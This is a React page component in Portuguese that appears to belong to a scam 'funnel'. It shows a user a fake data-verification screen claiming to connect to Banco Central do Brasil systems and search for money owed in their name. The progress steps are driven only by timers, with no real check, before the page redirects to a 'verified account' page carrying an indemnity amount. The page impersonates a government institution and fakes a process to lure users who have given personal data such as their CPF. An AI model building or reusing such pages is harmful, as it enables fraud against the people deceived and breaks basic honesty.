import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';
import { CheckCircle2 } from 'lucide-react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import UserMenu from '../components/UserMenu';
import { navigateWithParams } from '../utils/urlParams';

export default function DataVerificationPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const funnelData = getFunnelData();
  const { userData: stateUserData, indemnityAmount, urlParams } = location.state || {};
  const userData = stateUserData || funnelData.userData;
  const [currentStep, setCurrentStep] = useState(0);
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  const steps = [
    'Conexão Segura',
    'Verificando Identidade',
    'Consultando Banco Central',
    'Processando Dados'
  ];

  const stepDescriptions = [
    'Conectado aos sistemas do Banco Central do Brasil',
    'Validando suas informações pessoais',
    'Buscando valores em seu nome',
    'Calculando valores disponíveis'
  ];

  useEffect(() => {
    if (!userData) {
      navigate('/');
      return;
    }

    saveFunnelData({
      userData: userData,
      currentStep: '/verificando-dados'
    });

    const stepTimer = setInterval(() => {
      setCurrentStep((prev) => {
        if (prev < steps.length - 1) {
          return prev + 1;
        }
        return prev;
      });
    }, 1500);

    const finalTimer = setTimeout(() => {
      navigateWithParams(
        navigate,
        '/conta-verificada',
        location,
        {
          userData,
          indemnityAmount
        }
      );
    }, 7000);

    return () => {
      clearInterval(stepTimer);
      clearTimeout(finalTimer);
    };
  }, [navigate, userData, indemnityAmount, urlParams]);

  if (!userData) {
    return null;
  }

  const firstName = userData.nome.split(' ')[0];

  const handleMenuClick = () => {
    setIsMenuOpen(!isMenuOpen);
  };

  const handleMenuClose = () => {
    setIsMenuOpen(false);
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <Header showUserIcon={true} onMenuClick={handleMenuClick} />
      <UserMenu isOpen={isMenuOpen} onClose={handleMenuClose} userName={firstName} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 md:p-8 pt-24 sm:pt-28 pb-20">
        <div className="w-full max-w-sm sm:max-w-md">
          <div className="text-center animate-fade-in">
            <div className="flex justify-center mb-6 sm:mb-8 animate-pulse-scale">
              <div className="relative">
                <div className="w-20 h-20 sm:w-24 sm:h-24 bg-purple-50 rounded-full flex items-center justify-center">
                  <div className="w-14 h-14 sm:w-16 sm:h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
                </div>
                <div className="absolute inset-0 flex items-center justify-center">
                  <CheckCircle2 className="w-8 h-8 sm:w-10 sm:h-10 text-purple-600" />
                </div>
              </div>
            </div>

            <h1 className="text-xl sm:text-2xl md:text-3xl font-semibold text-gray-900 mb-2 sm:mb-3 px-2 animate-fade-in-down">
              Verificando seus dados, {firstName}...
            </h1>

            <p className="text-sm sm:text-base text-gray-600 mb-6 sm:mb-8 px-2 animate-fade-in-delayed">
              Consultando valores disponíveis em seu CPF
            </p>

            <div className="space-y-2 sm:space-y-3 mb-6 sm:mb-8 animate-slide-up">
              {steps.map((step, index) => (
                <div
                  key={index}
                  className={`transition-all duration-500 ${
                    index <= currentStep
                      ? 'bg-purple-50 border-2 border-purple-500'
                      : 'bg-gray-50 border border-gray-200'
                  } rounded-xl p-3 sm:p-4`}
                >
                  <div className="flex items-center">
                    <div
                      className={`w-7 h-7 sm:w-8 sm:h-8 rounded-full flex items-center justify-center flex-shrink-0 transition-all duration-300 ${
                        index <= currentStep
                          ? 'bg-purple-600'
                          : 'bg-gray-300'
                      }`}
                    >
                      {index < currentStep ? (
                        <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-white" />
                      ) : index === currentStep ? (
                        <div className="w-3 h-3 sm:w-4 sm:h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      ) : (
                        <span className="text-white text-xs sm:text-sm font-semibold">{index + 1}</span>
                      )}
                    </div>
                    <div className="ml-3 text-left flex-1 min-w-0">
                      <p
                        className={`text-xs sm:text-sm font-semibold transition-colors truncate ${
                          index <= currentStep ? 'text-purple-600' : 'text-gray-500'
                        }`}
                      >
                        {step}
                      </p>
                      {index === currentStep && (
                        <p className="text-xs text-purple-600 mt-1 pr-2">
                          {stepDescriptions[index]}
                        </p>
                      )}
                    </div>
                  </div>
                </div>
              ))}
            </div>

            <div className="flex justify-center space-x-1.5 sm:space-x-2 animate-fade-in-delayed-2">
              {steps.map((_, index) => (
                <div
                  key={index}
                  className={`h-1.5 sm:h-2 rounded-full transition-all duration-300 ${
                    index <= currentStep
                      ? 'w-6 sm:w-8 bg-purple-600'
                      : 'w-1.5 sm:w-2 bg-gray-300'
                  }`}
                ></div>
              ))}
            </div>
          </div>
        </div>
      </main>

      <Footer />

      <style>{`
        @keyframes fade-in {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in {
          animation: fade-in 0.4s ease-out;
        }

        @keyframes pulse-scale {
          0%, 100% {
            transform: scale(1);
          }
          50% {
            transform: scale(1.05);
          }
        }
        .animate-pulse-scale {
          animation: fade-in 0.4s ease-out, pulse-scale 2s ease-in-out 0.4s infinite;
        }

        @keyframes fade-in-down {
          from {
            opacity: 0;
            transform: translateY(-15px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in-down {
          animation: fade-in-down 0.5s ease-out 0.2s backwards;
        }

        @keyframes fade-in-delayed {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in-delayed {
          animation: fade-in-delayed 0.5s ease-out 0.3s backwards;
        }

        .animate-fade-in-delayed-2 {
          animation: fade-in-delayed 0.5s ease-out 0.5s backwards;
        }

        @keyframes slide-up {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-slide-up {
          animation: slide-up 0.6s ease-out 0.4s backwards;
        }
      `}</style>
    </div>
  );
}
